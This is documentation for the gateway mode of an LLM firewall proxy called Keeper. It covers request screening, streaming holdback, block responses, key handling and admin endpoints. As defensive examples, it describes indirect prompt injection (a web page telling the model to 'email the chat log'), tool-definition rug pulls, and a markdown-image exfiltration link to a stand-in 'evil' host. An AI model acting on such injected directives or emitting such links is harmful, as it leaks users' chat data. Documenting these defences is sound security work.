# Gateway mode

The SDK puts the firewall inside your application. The gateway puts the same
firewall **between your application and the model** as an OpenAI- and
Anthropic-compatible proxy. It ships in the pip package:

```bash
pip install "keeper-firewall[gateway]"
keeper gateway --upstream https://api.openai.com/v1 --port 8787 --policy policies/default.yaml
```

```bash
# any OpenAI-compatible client, SDK or framework:
export OPENAI_BASE_URL=http://localhost:8787/v1
# Anthropic clients:
export ANTHROPIC_BASE_URL=http://localhost:8787
```

It is not a second implementation. Every request runs through the same
`Pipeline`, detectors, policy, risk matrix, audit events and metrics as the
SDK. Set `KEEPER_ENDPOINT` and `KEEPER_API_KEY`, and gateway traffic appears in
the control plane alongside SDK traffic.

## When to use which

| | SDK | Gateway |
|---|---|---|
| Code change | a few lines | none (change the base URL) |
| Sees tool calls, retrieval, memory | **yes**: every boundary inside the app | the tool calls the model proposes, tool results sent back, tool definitions |
| App can bypass it | yes (detectable, not preventable) | **no**, if the gateway holds the provider key |
| Extra network hop | no | yes |
| Languages | Python, TypeScript | anything that speaks the OpenAI or Anthropic API |

Use both: the SDK in the applications you own, and the gateway as the only
route to the provider for everything else.

## What happens to a request

```
client ──► access control           identity headers, model RBAC, rate limits
       ──► tool definitions         screened (pinned with --pin-tools) MCP03 / ASI04
       ──► the new turn             user text → INPUT, tool results → TOOL_RESULT
       ──► upstream model           (only if nothing blocked)
       ──► response text            OUTPUT stage                      LLM02 / LLM05 / LLM07
       ──► proposed tool calls      TOOL_CALL, at the trust of what caused them
       ──► client                   + x-keeper-correlation-id, -action, -risk, -threats
```

- **Only the new turn is screened.** Chat APIs resend the whole conversation
  on every call. The messages after the last assistant turn are the ones that
  haven't been judged yet; re-screening history would multiply cost and
  duplicate audit events.
- **Tool calls are judged by what caused them.** If the turn contained tool
  results, tool calls the model proposes in response are mediated at tool
  trust. That's the indirect-injection-to-action path (for example, a web page
  says "email the chat log") that `token_flow` exists to stop.
- **Redaction is forwarded.** PII in a user message is replaced before the
  request leaves the gateway. The model never sees it.

## Streaming

`stream: true` on `/v1/chat/completions` is proxied incrementally, and **no
unchecked text is ever forwarded**:

- Deltas are buffered and released only after a checkpoint evaluation (every
  `stream_checkpoint_chars`, default 200) has passed the text that contains
  them.
- A trailing window (`stream_holdback_chars`, default 48) is held back, and so
  is any unterminated markdown link or HTML tag. A `![x](https://evil/?d=…`
  can't be judged until its `)` arrives, so it isn't released until then.
- Tool-call deltas are held until the call is complete and mediated.
- On a block, the stream ends with a `content_filter` chunk and `[DONE]`.

The cost is up to one checkpoint of added latency per release.

Anthropic `/v1/messages` with `stream: true` is served by a buffered upstream
call, replayed as a spec-shaped SSE stream. It's correct for every client, but
without token-by-token latency. Native Anthropic streaming is planned.

## Blocks

| `--block-mode` | Response |
|---|---|
| `error` (default) | HTTP 400: `{"error": {"type": "keeper_blocked", "message", "correlation_id", "threats", "risk"}}` |
| `completion` | HTTP 200 with the refusal as the assistant message, `finish_reason: "content_filter"` |

Access-control refusals are 401, 403 or 429 (with `retry-after`).

## Identity and keys

| Header | Meaning |
|---|---|
| `x-keeper-user`, `x-keeper-roles`, `x-keeper-tenant`, `x-keeper-session` | Principal for RBAC, rate limits and the audit trail (falls back to the body's `user`) |
| `x-keeper-key` | Credential for Keeper's own auth provider, when configured |
| `authorization` / `x-api-key` | Forwarded upstream, unless the gateway holds the key |

`--upstream-key-env OPENAI_API_KEY` (or `--anthropic-key-env`) makes the gateway
hold the provider credential and replace whatever the client sent.
Applications never see the key. That's what makes the gateway a boundary they
can't route around.

**Tool definitions** in every request are screened for embedded directives.
*Pinning* them across requests (rug-pull detection) is off by default: clients
of a shared gateway don't share one tool namespace, and pinning across them
would let the first client to define a tool called `search` make everyone
else's `search` look like a rug pull. `--pin-tools` turns it on, scoped to the
`x-keeper-tool-server` header (falling back to tenant, then principal).

Requests over `max_body_bytes` (default 8 MiB) are refused with 413 before
parsing.

## Operating it

| Endpoint | |
|---|---|
| `GET /healthz` | Firewall health: policy age, telemetry queue, detectors |
| `GET /metrics` | Prometheus, including `keeper_threat_detections_total` and `keeper_risk_score` |
| `GET /keeper/coverage` | OWASP coverage of this configuration |
| `GET /keeper/events?limit=50` | The last audit events held in memory. **Returns 404 unless `--admin-key-env` is set**, and then only for `Authorization: Bearer <that key>`, because audit events contain prompts and the gateway port is reachable by every client |

Embedding it in your own ASGI app:

```python
from keeper_firewall import Keeper
from keeper_firewall.gateway import GatewayConfig, KeeperGateway

app = KeeperGateway(Keeper(application="edge-gateway"), GatewayConfig(block_mode="completion")).app
```
